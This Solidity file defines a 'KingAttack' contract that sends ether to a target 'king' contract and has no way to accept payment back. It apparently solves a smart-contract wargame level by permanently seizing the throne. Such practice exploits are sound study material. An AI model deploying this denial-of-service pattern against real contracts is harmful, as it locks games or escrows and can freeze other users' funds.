// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;


contract KingAttack {
    constructor(address king) payable{
        king.call{value: msg.value}('');
    }
}
